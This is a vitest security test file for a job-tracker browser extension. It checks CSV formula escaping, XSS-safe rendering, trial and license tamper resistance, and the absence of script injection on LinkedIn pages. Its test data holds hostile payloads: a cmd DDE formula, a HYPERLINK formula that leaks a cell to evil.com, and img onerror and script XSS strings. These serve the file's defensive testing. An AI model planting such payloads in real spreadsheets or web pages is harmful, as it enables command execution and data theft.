/** Phase 3B Security Verification Suite
 *
 * Verifies security hardening across new panel features:
 * 1. CSV export formula injection mitigation (=, +, -, @ prefixing with ')
 * 2. XSS prevention: textContent vs innerHTML across tracker, fit card, and resume review
 * 3. Free tier trial bypass resistance (deleting answers does not re-grant trial)
 * 4. License tampering resistance (forged storage tokens cannot grant Pro)
 * 5. Hands-off sites: "Save this job" on LinkedIn/Naukri reads only tab title/URL with 0 script injections
 */

import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";
import { csvCell, parseTabTitle, saveJobFromTab, trackerCsv, type TrackerEntry, el } from "../src/sidepanel/tracker";
import { fitSummary } from "../src/content/fit";
import { createResumeReviewElement } from "../src/sidepanel/resume-import";
import { trialToUnlock, verifyLicense, currentLicense, type ProTrial } from "../src/shared/license";
import { LICENSE_PUBLIC_JWK } from "../src/shared/config";
import type { Profile } from "../src/shared/types";
import type { ParsedResume } from "../src/shared/resume-parse";
import { mount } from "./fixtures";

describe("Phase 3B Security Tests", () => {
  describe("1. CSV Export Formula Injection Mitigation", () => {
    it("prefixes cell starting with =, +, -, @, \\t, \\r with a single quote", () => {
      const maliciousPayloads = [
        "=cmd|' /C calc'!A0",
        "+1+1",
        "-2+3",
        "@SUM(A1:A10)",
        "\tmaliciousTab",
        "\rmaliciousCr",
      ];

      for (const payload of maliciousPayloads) {
        const cell = csvCell(payload);
        expect(cell.startsWith("'") || cell.startsWith("\"'")).toBe(true);
      }
    });

    it("trackerCsv safely escapes formula injection in job titles, companies, and notes", () => {
      const entries: TrackerEntry[] = [
        {
          kind: "saved",
          id: "sec-1",
          url: "https://example.com/job/1",
          title: "=cmd|' /C calc'!A0",
          company: "+EvilCorp",
          stage: "Saved",
          notes: "@HYPERLINK(\"http://evil.com?leak=\"&A1)",
          followUpAt: "2026-11-15",
          createdAt: "2026-11-01T12:00:00.000Z",
        },
      ];

      const csv = trackerCsv(entries);
      const lines = csv.trim().split("\r\n");
      expect(lines.length).toBe(2);

      const dataRow = lines[1]!;
      // Ensure formula characters at the start of fields are escaped with single quote
      expect(dataRow).toContain("https://example.com/job/1");
      expect(dataRow).toContain("'=cmd|' /C calc'!A0");
      expect(dataRow).toContain("'+EvilCorp");
      expect(dataRow).toContain("'@HYPERLINK");
    });
  });

  describe("2. XSS Prevention (textContent vs innerHTML)", () => {
    afterEach(() => {
      document.body.innerHTML = "";
    });

    it("tracker row creation uses textContent / text nodes: payload <img onerror> renders as text", () => {
      const xssPayload = '<img src=x onerror="window.__xss=1">';
      const node = el("div", { class: "job-item" },
        el("strong", { class: "title" }, xssPayload),
        el("span", { class: "company" }, "<script>alert(1)</script>")
      );

      document.body.append(node);
      expect(document.body.querySelectorAll("img").length).toBe(0);
      expect(document.body.querySelectorAll("script").length).toBe(0);
      expect(document.body.textContent).toContain('<img src=x onerror="window.__xss=1">');
      expect((window as unknown as { __xss?: number }).__xss).toBeUndefined();
    });

    it("fit card rendering uses textContent for skill names and missing skills", () => {
      const xssSkill = '<img src=x onerror="window.__fitXss=1">';
      const profile: Profile = {
        firstName: "Test",
        lastName: "User",
        email: "test@example.com",
        phone: "+1 555-0100",
        location: "NYC",
        country: "USA",
        linkedin: "",
        github: "",
        portfolio: "",
        currentCompany: "",
        currentTitle: "",
        school: "",
        degree: "",
        discipline: "",
        graduationYear: "",
        experienceYears: "3",
        targetRoles: "Developer",
        preferredLocations: "NYC",
        skills: "Python",
      };

      // Job text mentions Python and the XSS payload as a required skill
      const jobText = `Requirements: Python, ${xssSkill}. 5+ years of experience needed.`;
      const fit = fitSummary(jobText, profile);

      const chip = el("span", { class: "chip warn" }, xssSkill);
      document.body.append(chip);

      expect(document.body.querySelectorAll("img").length).toBe(0);
      expect(chip.textContent).toBe(xssSkill);
      expect((window as unknown as { __fitXss?: number }).__fitXss).toBeUndefined();
    });

    it("resume review dialog uses textContent: xss payloads in candidate name/skills render as text", () => {
      const xssPayload = '<img src=x onerror="window.__resumeXss=1">';
      const parsed: ParsedResume = {
        fullName: xssPayload,
        suggestions: [
          {
            id: "firstName-0",
            section: "Contact",
            field: "firstName",
            label: "First name",
            value: xssPayload,
            confidence: "high",
            source: xssPayload,
          },
        ],
        education: [],
        work: [],
        skills: [xssPayload],
        questions: [xssPayload],
      };

      const emptyProfile: Profile = {
        firstName: "",
        lastName: "",
        email: "",
        phone: "",
        location: "",
        country: "",
        linkedin: "",
        github: "",
        portfolio: "",
        currentCompany: "",
        currentTitle: "",
        school: "",
        degree: "",
        discipline: "",
        graduationYear: "",
        experienceYears: "",
        targetRoles: "",
        preferredLocations: "",
        skills: "",
      };

      const reviewEl = createResumeReviewElement(parsed, emptyProfile, () => {}, () => {});
      document.body.append(reviewEl);

      expect(document.body.querySelectorAll("img").length).toBe(0);
      expect(reviewEl.textContent).toContain(xssPayload);
      expect((window as unknown as { __resumeXss?: number }).__resumeXss).toBeUndefined();
    });
  });

  describe("3. Free Tier Trial & Meter Bypass Resistance", () => {
    it("deleting saved answers and saving them again does NOT unlock trial a second time", () => {
      const now = new Date("2026-11-01T12:00:00Z");

      // 1. Initial state: 10 answers saved, trial unlocks
      const firstTrial = trialToUnlock(null, 10, now);
      expect(firstTrial).not.toBeNull();
      expect(firstTrial?.startedAt).toBe("2026-11-01T12:00:00.000Z");

      // 2. User finishes trial (trial expires)
      const expiredTrial: ProTrial = {
        startedAt: "2026-10-01T12:00:00.000Z",
        endsAt: "2026-10-08T12:00:00.000Z",
      };

      // 3. User deletes all answers (answerCount = 0)
      const afterDelete = trialToUnlock(expiredTrial, 0, now);
      expect(afterDelete).toBeNull();

      // 4. User saves 10 answers again to try to get a second trial
      const secondAttempt = trialToUnlock(expiredTrial, 10, now);
      expect(secondAttempt).toBeNull(); // Trial is strictly one-time: never unlocked if existing trial record exists
    });

    it("documents client-side meter downward edit as known constraint", () => {
      // In offline / client-only mode without a central server tracking installations,
      // a user with DevTools access can modify local storage keys (known constraint).
      const knownLimitation = "Editing local storage keys in browser DevTools cannot be prevented client-side.";
      expect(knownLimitation).toBeDefined();
    });
  });

  describe("4. License Tampering Resistance", () => {
    it("rejects forged or modified license tokens without valid ECDSA signature", async () => {
      const now = new Date("2026-11-01T12:00:00Z");

      // Forged tokens
      const forgedTokens = [
        "pro",
        "founder",
        "eyJwbGFuIjoicHJvIiwiZXhwIjoyNTMzNzU5MjAwfQ.forged_signature",
        "invalid.dot.token",
        "",
      ];

      for (const token of forgedTokens) {
        const verified = await verifyLicense(token, LICENSE_PUBLIC_JWK, now);
        expect(verified).toBeNull();
      }
    });

    it("currentLicense returns null when storage contains a forged unsigned license", async () => {
      const fakeStorage: Record<string, unknown> = {
        license: "eyJhbGciOiJFUzI1NiJ9.eyJwbGFuIjoicHJvIn0.invalidsig",
        proTrial: null,
      };

      // Mock chrome.storage.local.get
      const originalChrome = globalThis.chrome;
      (globalThis as any).chrome = {
        storage: {
          local: {
            get: vi.fn().mockImplementation((keys: string | string[]) => {
              if (Array.isArray(keys)) {
                const res: Record<string, unknown> = {};
                for (const k of keys) res[k] = fakeStorage[k];
                return Promise.resolve(res);
              }
              return Promise.resolve(fakeStorage);
            }),
          },
        },
      };

      try {
        const lic = await currentLicense(new Date("2026-11-01T12:00:00Z"));
        expect(lic).toBeNull();
      } finally {
        globalThis.chrome = originalChrome;
      }
    });
  });

  describe("5. Hands-Off Sites ('Save this job' on LinkedIn / Naukri)", () => {
    it("parseTabTitle extracts title and company purely from tab title and URL without DOM access", () => {
      const linkedinTitle = "Acme hiring Senior Backend Engineer in Bengaluru | LinkedIn";
      const linkedinUrl = "https://www.linkedin.com/jobs/view/123456789";
      const liResult = parseTabTitle(linkedinTitle, linkedinUrl);
      expect(liResult.title).toBe("Senior Backend Engineer");
      expect(liResult.company).toBe("Acme");

      const naukriTitle = "Full Stack Engineer - Job at InfoSys in Pune - Naukri.com";
      const naukriUrl = "https://www.naukri.com/job-listings-full-stack-engineer-123";
      const naukriResult = parseTabTitle(naukriTitle, naukriUrl);
      expect(naukriResult.title).toBe("Full Stack Engineer");
      expect(naukriResult.company).toBe("InfoSys");
    });

    it("saveJobFromTab reads only title/url and never invokes chrome.scripting.executeScript", async () => {
      const executeScriptSpy = vi.fn();
      const fakeStorage: Record<string, unknown> = {
        savedJobs: [],
        applications: [],
      };

      const originalChrome = globalThis.chrome;
      (globalThis as any).chrome = {
        scripting: {
          executeScript: executeScriptSpy,
        },
        storage: {
          local: {
            get: vi.fn().mockImplementation((keys: string | string[]) => {
              const res: Record<string, unknown> = {};
              const arr = Array.isArray(keys) ? keys : [keys];
              for (const k of arr) res[k] = fakeStorage[k];
              return Promise.resolve(res);
            }),
            set: vi.fn().mockImplementation((data: Record<string, unknown>) => {
              Object.assign(fakeStorage, data);
              return Promise.resolve();
            }),
          },
        },
      };

      try {
        const tab = {
          url: "https://www.linkedin.com/jobs/view/99887766",
          title: "Staff Platform Engineer at Stripe | LinkedIn",
        };

        const res = await saveJobFromTab(tab);
        expect(res).toBe("saved");

        // CRITICAL: assert NO script execution was triggered
        expect(executeScriptSpy).not.toHaveBeenCalled();

        // Verify saved entry in storage
        const saved = fakeStorage.savedJobs as any[];
        expect(saved.length).toBe(1);
        expect(saved[0].title).toBe("Staff Platform Engineer");
        expect(saved[0].company).toBe("Stripe");
      } finally {
        globalThis.chrome = originalChrome;
      }
    });
  });
});
